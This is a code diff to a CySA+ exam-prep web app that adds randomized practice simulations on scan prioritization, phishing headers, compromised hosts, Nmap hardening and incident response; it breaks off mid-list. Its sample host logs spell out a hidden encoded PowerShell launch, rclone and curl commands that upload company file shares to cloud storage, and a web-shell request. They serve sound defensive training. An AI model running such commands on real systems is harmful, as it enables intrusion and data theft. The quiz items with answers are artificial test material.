@@ -1169,7 +1169,7 @@ const MODULES = [
  {id:"frame",n:"12",stage:4,name:"Attack Frameworks",desc:"Cyber Kill Chain, Diamond Model, and MITRE ATT&CK.",covers:"Domain 3.0: attack methodology frameworks (3.1)."},
  {id:"ir",n:"13",stage:4,name:"Incident Response",desc:"The seven-phase process, plans, triage, evidence, and recovery.",covers:"Domain 3.0: the incident response process (3.2) and incident response techniques (3.3)."},
  {id:"report",n:"14",stage:4,name:"Reporting & Communication",desc:"Vulnerability reports, inhibitors, incident communication, and metrics.",covers:"Domain 4.0: vulnerability management reporting (4.1) and security operations and incident response reporting (4.2)."},
- {id:"pbq",n:"15",stage:5,name:"Performance-Based Questions",desc:"Six exam-style simulations: scan prioritization, phishing headers, compromised hosts, Nmap hardening, IR phases, and alert triage.",covers:"All four domains, in the drop-down simulation style of the exam. Every item is explained when you check."},
+ {id:"pbq",n:"15",stage:5,name:"Performance-Based Questions",desc:"Six exam-style simulations that change every run: scan prioritization, phishing headers, compromised hosts, Nmap hardening, IR phases, and alert triage.",covers:"All four domains, in the drop-down simulation style of the exam. Every run is a new variation with shuffled choices, and every item is explained when you check."},
  {id:"qualifier",n:"16",stage:5,name:"Question Qualifiers",desc:"Questions where FIRST, NEXT, BEST, MOST likely, or MINIMUM decides the answer.",covers:"All domains. 25 analyst scenarios across five qualifiers, each with a defensible runner-up, and the explanation says why it loses."},
  {id:"exam",n:"17",stage:5,name:"Mini-Exams",desc:"10, 20, or 40 multiple-choice questions, timed and weighted to the official domains.",covers:"All four domains, picked in proportion to CompTIA's weights (34 / 26 / 24 / 16) from 115 scenario questions."},
  {id:"cram",n:"",menu:true,name:"Cram Sheet",desc:"The high-yield facts on one page, for the night before.",covers:"The highest-yield CS0-004 facts on one page."},
@@ -1430,7 +1430,7 @@ function pbqProgress(id){ const h=P.pbq[id]||[]; const c=pbqClears(id); if(c>=PB
 function mastery(id){
   if(TERMSETS[id]) return termMastery(id);
   switch(id){
-    case "pbq":{ const n=CPBQ.filter(x=>pbqClears(x.id)>0).length; const best=CPBQ.reduce((a,x)=>a+Math.max(0,...(P.pbq[x.id]||[]).map(r=>r.score/r.total)),0)/CPBQ.length; return {v:n===CPBQ.length?1:Math.min(best,(n+0.99)/CPBQ.length),cap:`${n} of ${CPBQ.length} PBQs cleared`}; }
+    case "pbq":{ const v=CPBQ.reduce((a,x)=>a+pbqProgress(x.id),0)/CPBQ.length, n=CPBQ.filter(x=>pbqClears(x.id)>=PBQ_NEED).length; return {v,cap:`${n} of ${CPBQ.length} PBQs mastered`}; }
     case "acro":{ const l=acroCore(); const n=acroMastered(l); return {v:n/l.length,cap:`${n} of ${l.length} acronyms mastered`}; }
     case "qualifier":{ const Q=qualState(); const done=Q.filter(x=>x.mastered).length; const v=Q.reduce((a,x)=>a+Math.min(x.c,QUAL_NEED)/QUAL_NEED,0)/Q.length; return {v,cap:`${done} of ${Q.length} qualifiers mastered`}; }
     case "exam":{ const full=P.exams.filter(e=>e.total>=EXAM_FULL_MIN).slice(-EXAM_NEED); if(!full.length) return {v:0,cap:P.exams.length?"Take a 20- or 40-question exam to count":"No exams yet"}; const v=full.reduce((a,e)=>a+e.score/e.total,0)/EXAM_NEED; return {v,cap:`Last ${full.length} of ${EXAM_NEED} full exams · avg ${pct(full.reduce((a,e)=>a+e.score/e.total,0)/full.length)}%`}; }
@@ -1950,162 +1950,262 @@ Object.assign(LABS,{
 });
 
 /* ---- CySA+ performance-based questions ----
-   Each PBQ: a scenario, exhibits (logs, tables, scan output), and items answered from drop-down lists, like the
-   simulations on the real exam. Check grades every item and explains it. A run at 90%+ counts as a clear (PBQ_CLEAR). */
+   Each PBQ is a generator: every run draws a new variation (findings, hosts, alerts, ports, names, times) from a pool,
+   then shows exhibits and drop-down items like the exam's simulations. Drop-down options are shuffled each run, except
+   lists with a natural order (IR phases, 1st-4th, finding letters). A run at 90%+ counts as a clear (PBQ_CLEAR). */
+const pbqPick=a=>a[Math.floor(Math.random()*a.length)];
+const pbqPickN=(a,n)=>shuffle(a.slice()).slice(0,n);
+const LETTERS="ABCDEFGH".split("");
+
+/* 1. Vulnerability prioritization */
+const VP_ACTS=["Emergency patch now","Fix in the next maintenance window","Apply a compensating control","Accept and document an exception","Mark as a false positive"];
+const VP_POOL=[
+ {a:0,h:"vpn01",c:"Internet-facing VPN appliance",f:"Unauthenticated remote code execution",cv:"9.8",ep:"0.97",k:"Yes",x:"Internet-facing, unauthenticated, very high EPSS, and on KEV (actively exploited). This is an emergency change, not a scheduled one."},
+ {a:0,h:"mail01",c:"Internet-facing mail server used by every employee",f:"Authentication bypass leading to remote code execution",cv:"9.1",ep:"0.94",k:"Yes",x:"Exposed to the internet and on KEV with very high EPSS. Attackers are already using it; patch now under an emergency change."},
+ {a:0,h:"fw-edge",c:"Perimeter firewall; management page reachable from the internet",f:"Command injection in the management interface",cv:"10.0",ep:"0.95",k:"Yes",x:"Owning the firewall means owning the perimeter. KEV-listed and internet-reachable: emergency patch, and pull the management page off the internet."},
+ {a:1,h:"hrdb01",c:"Internal database with employee PII, reachable from user VLANs",f:"SQL injection in internal HR app",cv:"8.8",ep:"0.02",k:"No",x:"High CVSS and sensitive data, but internal only, low EPSS, and not on KEV. Fix it on a short, scheduled timeline rather than as an emergency."},
+ {a:1,h:"prn-3f",c:"Office printer",f:"SNMP v2c with default community string \"public\"",cv:"5.3",ep:"0.04",k:"No",x:"A real but low-severity configuration issue. Change the community string or move to SNMPv3 in the normal window."},
+ {a:1,h:"ws-fleet",c:"400 managed Windows laptops",f:"Local privilege escalation; this month's cumulative update missing",cv:"7.8",ep:"0.05",k:"No",x:"Needs local access first, low EPSS, not on KEV. Roll it out with the normal patch cycle."},
+ {a:1,h:"intranet",c:"Internal intranet web server",f:"TLS 1.0 and weak ciphers enabled",cv:"5.9",ep:"0.01",k:"No",x:"Weak but not actively exploited, internal only. Disable TLS 1.0 in the next window."},
+ {a:2,h:"plc-hmi2",c:"Plant-floor HMI; vendor has no patch; cannot be rebooted during production",f:"Hard-coded credentials in HMI service",cv:"8.1",ep:"0.40",k:"No",x:"No patch and the OT system cannot go down. Segment it, restrict access with ACLs, and monitor it: a compensating control."},
+ {a:2,h:"mri-ws1",c:"Medical imaging workstation; the vendor's certification forbids OS patches",f:"SMB remote code execution",cv:"8.8",ep:"0.60",k:"No",x:"Patching would void the device's certification. Isolate it on its own segment and block SMB to it: compensate until the vendor ships a fix."},
+ {a:2,h:"erp-legacy",c:"Business-critical ERP on an end-of-life OS; migration scheduled next year",f:"Unpatched kernel flaw; no fix will ever be released",cv:"9.0",ep:"0.30",k:"No",x:"No patch exists and the system must keep running. Restrict access, add monitoring, and document it until the migration: a compensating control."},
+ {a:3,h:"labws07",c:"Isolated test PC, no route to production, decommission in 5 days",f:"Remote code execution in old browser",cv:"9.8",ep:"0.01",k:"No",x:"Isolated, nothing to reach, low EPSS, and retired in five days. Accepting the risk with a documented, time-limited exception is reasonable."},
+ {a:3,h:"kiosk-demo",c:"Offline trade-show kiosk, never connected to any network, no sensitive data",f:"Outdated media player with a file-parsing flaw",cv:"6.5",ep:"0.01",k:"No",x:"No network, no data, low probability. The cost of fixing outweighs the risk: accept it with a documented exception."},
+ {a:4,h:"web03",c:"Ubuntu web server (Linux)",f:"Windows SMBv1 remote code execution, found by a non-credentialed scan; a credentialed scan shows no SMB service",cv:"8.1",ep:"0.95",k:"Yes",x:"A Windows SMB flaw on a Linux host, disproved by a credentialed scan: a false positive. The scary EPSS and KEV values belong to the CVE, not to this host."},
+ {a:4,h:"app02",c:"RHEL application server",f:"Apache path traversal reported from the version banner; a credentialed check shows the vendor's backported fix is installed",cv:"7.5",ep:"0.94",k:"Yes",x:"The banner shows an old version number, but the distribution backported the fix. The credentialed check proves the code is patched: false positive."},
+ {a:4,h:"db07",c:"PostgreSQL server",f:"Oracle default password on port 1521; a credentialed scan shows no Oracle software, and 1521 belongs to a monitoring agent",cv:"7.3",ep:"0.10",k:"No",x:"The finding is about software that is not installed. The scanner guessed from the port: false positive."}];
+const VP_CONCEPT=[
+ {q:"Which data point BEST shows a vulnerability is being exploited in the wild right now?",o:["Listed in CISA KEV","A CVSS base score of 9.8","An EPSS of 0.40","Found by a credentialed scan"],a:0,x:"KEV lists vulnerabilities with confirmed exploitation. EPSS is a probability; CVSS measures severity, not activity."},
+ {q:"What does an EPSS score of 0.97 mean?",o:["A 97% estimated chance of exploitation in the next 30 days","The vulnerability is 97% as severe as the worst possible one","97% of scanners detect it","The patch fixes 97% of the risk"],a:0,x:"EPSS (from FIRST) estimates the probability that a vulnerability will be exploited in the wild within 30 days."},
+ {q:"Why is a credentialed scan usually more accurate?",o:["It logs in and checks installed software and settings directly","It is faster than a non-credentialed scan","It shows what an outside attacker sees","It does not need network access"],a:0,x:"Logging in lets the scanner read package versions and configuration instead of guessing from banners, which cuts false positives."},
+ {q:"Two findings share a CVSS of 9.8. One is on an internet-facing server, the other on an isolated lab PC. What should break the tie?",o:["Asset exposure and value (context)","Whichever was found first","The vendor's name","Alphabetical order of the hostnames"],a:0,x:"CVSS base scores ignore your environment. Exposure, asset value, and exploitation data decide real priority."}];
+function genVuln(){
+  const by=a=>VP_POOL.filter(f=>f.a===a);
+  const set=shuffle([pbqPick(by(0)),...pbqPickN(by(1),2),pbqPick(by(2)),pbqPick(by(3)),pbqPick(by(4))]);
+  set.forEach((f,i)=>f.L=LETTERS[i]);
+  const first=set.find(f=>f.a===0);
+  const items=set.map((f,i)=>({sec:i?null:"Choose the action for each finding",q:`${f.L} · ${f.h}: ${f.f.split(";")[0].split(",")[0]}`,o:VP_ACTS,a:f.a,x:f.x}));
+  items.push({sec:"Decide",q:"Which finding do you remediate FIRST?",o:set.map(f=>f.L),ord:1,a:set.indexOf(first),x:`${first.L} (${first.h}): exposure plus active exploitation (KEV) plus high EPSS beats raw CVSS.`});
+  items.push(pbqPick(VP_CONCEPT));
+  return {brief:"You are the vulnerability analyst. The weekly scan returned the findings below. Use the asset context, CVSS, EPSS, and the CISA KEV catalog to choose the right action for each finding, then pick what to fix first.",
+    ex:[{t:"Scan findings",table:[["ID","Host","Asset context","Finding","CVSS","EPSS","KEV"],...set.map(f=>[f.L,f.h,f.c,f.f,f.cv,f.ep,f.k])]}],items};
+}
+
+/* 2. Phishing analysis */
+const PH_BRANDS=[
+ {b:"PayPal",real:"paypal.com",fake:"paypa1-secure.com",how:"the digit 1 replaces the letter l",subj:"Action required: refund of $482.19 on hold",vis:"https://www.paypal.com/refunds",path:"/signin?case=88231"},
+ {b:"Microsoft 365",real:"microsoft.com",fake:"rnicrosoft-support.com",how:"\"rn\" imitates the letter m",subj:"Your mailbox password expires today",vis:"https://login.microsoftonline.com",path:"/owa/auth/logon.aspx"},
+ {b:"DocuSign",real:"docusign.net",fake:"docusiqn-review.com",how:"the letter q imitates g",subj:"Please review and sign: Q4 bonus letter",vis:"https://www.docusign.net/review",path:"/sign?env=55120"},
+ {b:"UPS",real:"ups.com",fake:"ups-delivery-redirect.com",how:"the real brand name plus extra words makes a look-alike domain",subj:"Delivery failed: confirm your address",vis:"https://www.ups.com/track",path:"/confirm?pkg=1Z884"}];
+const PH_USERS=["jwu","pgarcia","tbrown","akhan","mlee","sroth","dnguyen","cbell","rpatel","hsato"];
+function genPhish(){
+  const B=pbqPick(PH_BRANDS), dk=Math.random()<.5, [u1,u2,u3]=pbqPickN(PH_USERS,3), n=20+Math.floor(Math.random()*40);
+  const ip=`203.0.113.${20+Math.floor(Math.random()*200)}`;
+  /* a random weekday-ish date and zone for the time question */
+  const [zn,zl,std]=pbqPick(ZONES); let m,d; do{ m=Math.floor(Math.random()*12); d=1+Math.floor(Math.random()*28); }while((m===2&&Math.abs(d-8)<=1)||(m===10&&Math.abs(d-1)<=1)||(m===9&&d>=30));
+  const dst=usDST(2026,m,d), off=std+(dst?1:0), wOff=std+(dst?0:1), ab=zl+(dst?"DT":"ST"), wab=zl+(dst?"ST":"DT");
+  const h0=8+Math.floor(Math.random()*10), t0=Date.UTC(2026,m,d,h0,Math.floor(Math.random()*50),Math.floor(Math.random()*60));
+  const tc=t0+(5+Math.floor(Math.random()*20))*6e4, tp=tc+47e3, tv1=tc+(4+Math.floor(Math.random()*9))*6e4+Math.floor(Math.random()*59)*1e3, tv2=tv1+(10+Math.floor(Math.random()*20))*6e4+Math.floor(Math.random()*59)*1e3;
+  const hhmmss=ms=>{ const p=zParts(ms); return `${p2(p.h)}:${p2(p.mi)}:${p2(p.s)}Z`; };
+  const rows=shuffle([[tc,u1,"GET ",B.path,200],[tp,u1,"POST",B.path.split("?")[0],302],[tv1,u2,"GET ",B.path,200],[tv2,u3,"GET ",B.path,200]]).sort((a,b)=>a[0]-b[0]);
+  const auth=`Authentication-Results: mx1.corp.com;
+       spf=pass (sender IP ${ip} is permitted) smtp.mailfrom=${B.fake};
+       dkim=${dk?`pass header.d=${B.fake}`:"none"};
+       dmarc=fail (p=REJECT) header.from=${B.real}`;
+  const items=[
+   {sec:"Header analysis",q:"Why did SPF pass?",o:["SPF checked the attacker's own look-alike domain in the Return-Path",`${B.real} authorized the sending IP`,"DMARC overrode the SPF result","The Reply-To address was valid"],a:0,x:`SPF validates the envelope sender (Return-Path), ${B.fake}, which the attacker controls. A pass says nothing about the visible From: address.`},
+   {q:"Which result proves the From: address is spoofed?",o:[`dmarc=fail for header.from=${B.real}`,"spf=pass",dk?`dkim=pass header.d=${B.fake}`:"dkim=none","The Received line"],a:0,x:`DMARC needs SPF or DKIM to pass for a domain that aligns with the visible From:. ${dk?`DKIM passed, but for ${B.fake}, not ${B.real}.`:"Neither aligns with "+B.real+"."} So DMARC fails.`},
+   {q:`What technique does ${B.fake} use?`,o:["Typosquatting (look-alike domain)","URL shortening","DNS tunneling","Domain generation algorithm"],a:0,x:`It imitates ${B.real}: ${B.how}.`},
+   {sec:"Choose the response for each group",q:`${u1} (GET, then POST)`,o:["Reset the password, revoke sessions, and check MFA and mailbox rules","Check the endpoint with EDR and confirm nothing was entered","Purge the email from the mailbox","No action needed"],a:0,x:`A POST to the sign-in page means ${u1} probably entered credentials. Treat the account as compromised.`},
+   {q:`${u2} and ${u3} (GET only)`,o:["Reset the password, revoke sessions, and check MFA and mailbox rules","Check the endpoint with EDR and confirm nothing was entered","Purge the email from the mailbox","No action needed"],a:1,x:"They opened the page but did not submit anything. Verify the endpoints and confirm with the users; escalate if anything was entered or downloaded."},
+   {q:`The other ${n-3} recipients`,o:["Reset the password, revoke sessions, and check MFA and mailbox rules","Check the endpoint with EDR and confirm nothing was entered","Purge the email from the mailbox","No action needed"],a:2,x:"Remove the message before anyone else clicks. Nothing suggests their credentials were exposed."},
+   {q:`The domain ${B.fake}`,o:["Block it at the mail gateway and web proxy","Add it to the SPF record","Report it only after the investigation closes","No action needed"],a:0,x:"Blocking the sender and the landing page stops new deliveries and clicks while the investigation continues."},
+   {sec:"Timeline",q:`${u1} submitted the form at ${hhmmss(tp)} on ${MON[m]} ${d}. The SOC uses ${zn} time. When was that locally?`,o:[localStr(tp,off,ab),localStr(tp,wOff,wab),localStr(tp,-off,ab),localStr(tp,0,ab)],a:0,x:`${MON[m]} ${d} is ${dst?"inside":"outside"} daylight saving time (2026: Mar 8 to Nov 1), so ${ab} = UTC${off}. Subtract ${-off} hours.`}];
+  return {brief:`${n} employees received the email below. The proxy log shows who acted on it. Analyze the headers, then choose the response for each group.`,
+    ex:[{t:"Email headers",log:`Return-Path: <billing@${B.fake}>
+Received: from mail.${B.fake} (mail.${B.fake} [${ip}])
+        by mx1.corp.com with ESMTPS
+From: "${B.b}" <no-reply@${B.real}>
+Reply-To: support@${B.fake}
+Subject: ${B.subj}
+${auth}`},{t:"Link in the body",log:`Visible text:  ${B.vis}
+Actual href:   https://${B.fake}${B.path}`},
+     {t:`Proxy log (${MON[m]} ${d})`,log:rows.map(r=>`${hhmmss(r[0])}  ${r[1].padEnd(8)} ${r[2]} https://${B.fake}${r[3]}  ${r[4]}`).join("\n")}],items};
+}
+
+/* 3. Which hosts are compromised? */
+const HOST_NAMES=["WS-14","WS-22","WS-31","WS-40","LT-ACCT-07","LT-HR-03","FS-01","FS-02","DC-01","DC-02","APP-05","SQL-02"];
+function genHosts(){
+  const ws=pbqPickN(["WS-14","WS-22","WS-31","WS-40","LT-ACCT-07","LT-HR-03"],2), srv=pbqPick(["FS-01","FS-02","APP-05","SQL-02"]), dc=pbqPick(["DC-01","DC-02"]);
+  const [p0,clean]=ws, oct=10+Math.floor(Math.random()*200), ip0=`10.20.7.${oct}`, c2=`192.0.2.${10+Math.floor(Math.random()*200)}`;
+  const acct=pbqPick(["svc_backup","svc_sql","it_temp","svc_report"]), app=pbqPick([["OUTLOOK.EXE","Invoice.docm"],["WINWORD.EXE","Payroll_Update.docm"],["EXCEL.EXE","Q4_Bonus.xlsm"]]);
+  const exfil=pbqPick([{cmd:"rclone.exe copy D:\\Finance mega:fin",tac:"Exfiltration",what:"copying the Finance share to a cloud remote"},{cmd:"7z.exe a -pP@ss C:\\PerfLogs\\x.7z D:\\HR & curl.exe -T C:\\PerfLogs\\x.7z https://file.io",tac:"Exfiltration",what:"zipping the HR share with a password and uploading it"}]);
+  const T=h=>`${p2(h)}:${p2(Math.floor(Math.random()*60))}:${p2(Math.floor(Math.random()*60))}Z`;
+  const H=9+Math.floor(Math.random()*6);
+  const ev={
+   [p0]:`${p2(H)}:09:${p2(10+Math.floor(Math.random()*49))}Z  4688  ${app[0]} -> powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...
+${p2(H)}:10:20Z  FW    ${ip0} -> ${c2}:443  allow  bytes_out=512
+${p2(H)}:11:20Z  FW    ${ip0} -> ${c2}:443  allow  bytes_out=512
+${p2(H)}:12:20Z  FW    ${ip0} -> ${c2}:443  allow  bytes_out=514   (continues every 60 s)`,
+   [dc]:`${p2(H)}:20:01Z-${p2(H)}:21:40Z  4625 x 30  TargetUserName=Administrator  IpAddress=${ip0}  SubStatus=0xC000006A
+(no 4624 for Administrator from ${ip0})`,
+   [srv]:`${p2(H)}:34:52Z  4624  TargetUserName=${acct}  LogonType=3  IpAddress=${ip0}
+${p2(H)}:34:55Z  7045  ServiceName=PSEXESVC  ImagePath=%SystemRoot%\\PSEXESVC.exe
+${p2(H)}:35:10Z  4688  PSEXESVC.exe -> cmd.exe /c ${exfil.cmd}`,
+   [clean]:`${p2(H)}:01:58Z  MAIL  Same message as ${p0}'s user received. Attachment ${app[1]} BLOCKED (macro policy)
+(no process or network events of interest on ${clean})`};
+  const ST=["Compromised: isolate","Targeted, not compromised: monitor","Clean: no action"];
+  const why={[p0]:[0,`A macro (${app[0]}) launched hidden, encoded PowerShell, followed by a 60-second beacon to ${c2}.`],[dc]:[1,`30 failed Administrator logons from ${p0} and no success. Attacked but not breached; confirm the lockout policy and keep watching.`],
+    [srv]:[0,`A network logon from ${p0} as ${acct}, a PsExec service install, then ${exfil.what}: compromised, with data leaving.`],[clean]:[2,"The gateway blocked the attachment and nothing suspicious followed. Nothing to do beyond the purge for every recipient."]};
+  const order=shuffle([p0,dc,srv,clean]);
+  const tacQ=pbqPickN([
+   {q:`Which MITRE ATT&CK tactic does the PsExec activity on ${srv} show?`,o:["Lateral movement","Initial access","Reconnaissance","Impact"],a:0,x:`Stolen credentials plus a remote-execution tool to move from ${p0} to ${srv} is lateral movement.`},
+   {q:`Which tactic does the last command on ${srv} show?`,o:[exfil.tac,"Persistence","Privilege escalation","Discovery"],a:0,x:`${exfil.what[0].toUpperCase()+exfil.what.slice(1)} moves data out of the organization.`},
+   {q:`Which tactic do the 60-second connections from ${p0} to ${c2} show?`,o:["Command and control","Exfiltration","Lateral movement","Collection"],a:0,x:"Small, regular check-ins to one external host are a C2 beacon."},
+   {q:`Which tactic do the 30 failed Administrator logons on ${dc} show?`,o:["Credential access","Initial access","Defense evasion","Impact"],a:0,x:"Guessing passwords (brute force) is a Credential Access technique."}],2);
+  return {brief:"An EDR alert started an investigation. Review the evidence from four hosts, decide the status of each, and answer the follow-up questions.",
+    ex:order.map(h=>({t:h,log:ev[h]})),
+    items:[...order.map((h,i)=>({sec:i?null:"Status of each host",q:h,o:ST,ord:1,a:why[h][0],x:why[h][1]})),
+     {sec:"Follow-up",q:"Which host was patient zero?",o:order,a:order.indexOf(p0),x:`Everything else came from ${ip0} (${p0}) after the macro ran there.`},
+     {q:"Which account must be reset right away?",o:[acct,"Administrator",`The ${clean} user`,"krbtgt"],a:0,x:`${acct} logged on to ${srv} successfully. The Administrator logons all failed.`},...tacQ]};
+}
+
+/* 4. Nmap hardening */
+const NM_ACTS=["Disable the service","Keep open to the internet","Restrict to admin or internal sources","No action needed"];
+const NM_POOL=[
+ {p:"21/tcp",st:"open",sv:"ftp",v:"vsftpd 2.3.4",a:0,sev:10,x:"A web server does not need FTP, and vsftpd 2.3.4 is the release that shipped with a backdoor. Disable it and check the host for compromise."},
+ {p:"21/tcp",st:"open",sv:"ftp",v:"ProFTPD 1.3.8  (ftp-anon: Anonymous FTP login allowed)",a:0,sev:7,x:"Anonymous FTP on a public server lets anyone browse and often upload. The site does not need it: disable it."},
+ {p:"22/tcp",st:"open",sv:"ssh",v:"OpenSSH 8.9p1 Ubuntu 3ubuntu0.10",a:2,sev:2,x:"Admins need SSH, but not from the whole internet. Allow only admin IPs or a jump host, with key authentication."},
+ {p:"23/tcp",st:"open",sv:"telnet",v:"Linux telnetd",a:0,sev:6,x:"Telnet sends credentials in clear text, and SSH already does the job."},
+ {p:"445/tcp",st:"open",sv:"microsoft-ds",v:"Samba smbd 4.15",a:0,sev:8,x:"File sharing should never face the internet; SMB is a top worm and ransomware entry point."},
+ {p:"3306/tcp",st:"open",sv:"mysql",v:"MySQL 8.0.36",a:0,sev:5,x:"The database lives on an internal server, so a MySQL listener on the public web server should not be running at all."},
+ {p:"5900/tcp",st:"open",sv:"vnc",v:"VNC (protocol 3.8)",a:0,sev:7.5,x:"Remote desktop over VNC on a public server is a brute-force magnet. Remove it; admins use SSH from the jump host."},
+ {p:"6379/tcp",st:"open",sv:"redis",v:"Redis key-value store 6.0.16 (no authentication)",a:0,sev:9,x:"Unauthenticated Redis on the internet is routinely abused to write files and take over hosts. Disable it, or bind it to localhost if the app needs it."},
+ {p:"8080/tcp",st:"open",sv:"http",v:"Apache Tomcat 9.0.85 (/manager/html)",a:2,sev:4,x:"The Tomcat manager deploys code. If it is needed at all, it must be reachable only from admin addresses."},
+ {p:"3389/tcp",st:"filtered",sv:"ms-wbt-server",v:"",a:3,sev:0,x:"Filtered means a firewall is already dropping the probes. Nothing is exposed."},
+ {p:"25/tcp",st:"filtered",sv:"smtp",v:"",a:3,sev:0,x:"Filtered: the firewall already blocks it, so nothing is exposed."}];
+const NM_KEEP=[{p:"80/tcp",st:"open",sv:"http",v:"Apache httpd 2.4.58",a:1,sev:1,x:"Keep it for the public site, redirecting to HTTPS."},{p:"443/tcp",st:"open",sv:"ssl/http",v:"Apache httpd 2.4.58",a:1,sev:1,x:"This is the public site itself."}];
+const NM_FLAGS=[
+ {q:"Which Nmap option produced the VERSION column?",o:["-sV","-O","-sS","-Pn"],a:0,x:"-sV probes open ports to identify the service and version."},
+ {q:"The scan used -Pn. What does it do?",o:["Skips host discovery and scans as if the host is up","Scans UDP ports","Detects the operating system","Runs only a ping sweep"],a:0,x:"-Pn treats the host as online, useful when ICMP is blocked. -sU is UDP, -O is OS detection, -sn is a ping sweep."},
+ {q:"Which option would scan all 65,535 TCP ports instead of the default top 1,000?",o:["-p-","-F","-sn","-A"],a:0,x:"-p- means every port. -F is a fast scan of fewer ports; -sn skips port scanning."},
+ {q:"Which option adds OS detection?",o:["-O","-sV","-sU","-T4"],a:0,x:"-O fingerprints the operating system. -T4 only changes timing."},
+ {q:"What does the state \"filtered\" mean?",o:["Nmap cannot tell if the port is open because a firewall drops the probes","The port is open but needs a password","The service crashed during the scan","The port is closed and answered with a reset"],a:0,x:"Filtered = no answer, usually a firewall. Closed means the host answered with a reset."}];
+function genNmap(){
+  const disable=NM_POOL.filter(x=>x.a===0), others=NM_POOL.filter(x=>x.a!==0);
+  let set=[...pbqPickN(disable,3),pbqPick(others.filter(x=>x.a===2)),pbqPick(others.filter(x=>x.a===3)),...pbqPickN(NM_KEEP,1+Math.floor(Math.random()*2))];
+  const seen=new Set(); set=set.filter(x=>!seen.has(x.p)&&seen.add(x.p)); if(!set.some(x=>x.p==="22/tcp")&&Math.random()<.6) set.push(NM_POOL[2]);
+  set.sort((a,b)=>parseInt(a.p)-parseInt(b.p));
+  const top=set.reduce((a,b)=>b.sev>a.sev?b:a);
+  const name=pbqPick(["web02","www1","shop-web","portal01"]);
+  const urgentOpts=shuffle(set.filter(x=>x!==top&&x.st==="open")).slice(0,3).concat([top]);
+  return {brief:`This Nmap scan is of ${name}, a public web server in the DMZ. The application's database runs on an internal server. Choose the action for each port, then answer the follow-up questions.`,
+    ex:[{t:`nmap -sV -Pn ${name}.corp.com`,log:"PORT      STATE     SERVICE        VERSION\n"+set.map(x=>`${x.p.padEnd(9)} ${x.st.padEnd(9)} ${x.sv.padEnd(14)} ${x.v}`).join("\n")}],
+    items:[...set.map((x,i)=>({sec:i?null:"Action for each port",q:`${x.p} ${x.sv}${x.v?` (${x.v.split("  ")[0]})`:" (filtered)"}`,o:NM_ACTS,a:x.a,x:x.x})),
+      {sec:"Follow-up",q:"Which finding is MOST urgent?",o:urgentOpts.map(x=>`${x.p} ${x.sv}`),a:urgentOpts.length-1,x:`${top.p} ${top.sv}: ${top.x}`},...pbqPickN(NM_FLAGS,2)]};
+}
+
+/* 5. IR phases and order of volatility */
+const IR_PHASES=["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Post-incident"];
+const IR_SCEN=[
+ {t:"Ransomware",sit:`SIEM: 18,000 files renamed to *.lck on FS-01 in 6 minutes
+EDR: the same process tree on WS-31 and WS-40
+Initial access: unpatched VPN appliance (KEV-listed CVE)
+Offline backups from last night are available`,acts:[
+  ["Writing the ransomware playbook and running a tabletop exercise last quarter","Buying an EDR tool and testing offline backups before any incident"],
+  ["The SIEM alert on mass file renames","A user reports that her files will not open and end in .lck"],
+  ["Working out which hosts are affected and how the attacker got in","Reverse engineering the sample to find its persistence and C2"],
+  ["Isolating FS-01, WS-31, and WS-40 with EDR","Disabling the abused VPN account and blocking the C2 domain"],
+  ["Removing persistence and reimaging the infected hosts","Patching the VPN appliance that was the way in"],
+  ["Restoring files from offline backups and watching for reinfection","Bringing the file server back online in stages under extra monitoring"],
+  ["Lessons-learned meeting and after action report","Updating the playbook with what slowed the team down"]]},
+ {t:"Web server compromise",sit:`WAF: requests to /uploads/img.php?cmd=whoami on WEB-02
+EDR: w3wp.exe spawning cmd.exe and certutil.exe on WEB-02
+Initial access: unpatched file-upload flaw in the CMS`,acts:[
+  ["Deploying a WAF and writing the web-compromise runbook","Running a tabletop on a defaced website"],
+  ["The WAF alert on cmd= requests to an uploaded file","EDR flags w3wp.exe starting cmd.exe"],
+  ["Reviewing web logs to find when the web shell was uploaded and what it ran","Checking whether the attacker reached the database from WEB-02"],
+  ["Pulling WEB-02 out of the load balancer and blocking the attacker's IPs","Isolating WEB-02 on its own VLAN"],
+  ["Deleting the web shell and patching the CMS upload flaw","Rebuilding WEB-02 from a clean image"],
+  ["Putting the rebuilt WEB-02 back in the load balancer and watching it closely","Restoring site content from a known-good backup"],
+  ["Writing the after action report","Adding upload-folder monitoring based on what was missed"]]}];
+const VOL=[["CPU registers and cache",1],["RAM (memory capture)",2],["Swap file and pagefile",3],["Full disk image, hashed",4],["Logs already forwarded to the SIEM",5],["Archived backup tapes",6]];
+function genIR(){
+  const S=pbqPick(IR_SCEN), phases=shuffle([0,1,2,3,4,5,6]).slice(0,6);
+  const items=phases.map((ph,i)=>({sec:i?null:"Which phase is each action in?",q:pbqPick(S.acts[ph]),o:IR_PHASES,ord:1,a:ph,x:`${IR_PHASES[ph]}: ${["plans, tools, and exercises before an incident","noticing that something happened","scoping, root cause, and timeline","stopping the spread","removing the attacker and the way in","returning to normal operations under monitoring","reviewing and improving afterward"][ph]}.`}));
+  const vs=pbqPickN(VOL,4), ranked=vs.slice().sort((a,b)=>a[1]-b[1]);
+  shuffle(vs).forEach((v,i)=>items.push({sec:i?null:"Collect evidence in order of volatility",q:v[0],o:["1st","2nd","3rd","4th"],ord:1,a:ranked.indexOf(v),x:`Most volatile first: ${ranked.map(r=>r[0]).join(" → ")}.`}));
+  return {brief:`A ${S.t.toLowerCase()} incident is being worked. Place each action in its incident response phase, then put the evidence in collection order.`,ex:[{t:"Situation",log:S.sit}],items};
+}
+
+/* 6. Alert queue */
+const Q_DISP=["Escalate (true positive)","Close: already contained (true positive)","Close as benign (authorized)","Close and tune (false positive)"];
+const Q_POOL=[
+ {n:"Impossible travel: mlee, Denver then Frankfurt in 20 minutes",c:"Frankfurt is the egress of the company's own cloud VPN, which mlee connected to. This fires for VPN users every day.",a:3,x:"The rule keeps mistaking the company's VPN egress for travel. Close it and add the VPN egress IPs to known locations."},
+ {n:"EDR: adware quarantined in Downloads",c:"The file never ran; EDR blocked and quarantined it on write.",a:1,x:"Real, unwanted software, but the control worked before it ran. Document it and close."},
+ {n:"Mass file rename to *.lck on FS-01",c:"18,000 files in 6 minutes; the process is unsigned and runs from C:\\ProgramData.",a:0,s:10,x:"An unsigned process encrypting thousands of files is active ransomware."},
+ {n:"Port scan from 10.0.0.50 across all subnets",c:"Change ticket CHG-3301: the approved pen-test firm is testing from 10.0.0.50 this week.",a:2,x:"The detection was right and the activity is authorized. Close it with the ticket reference."},
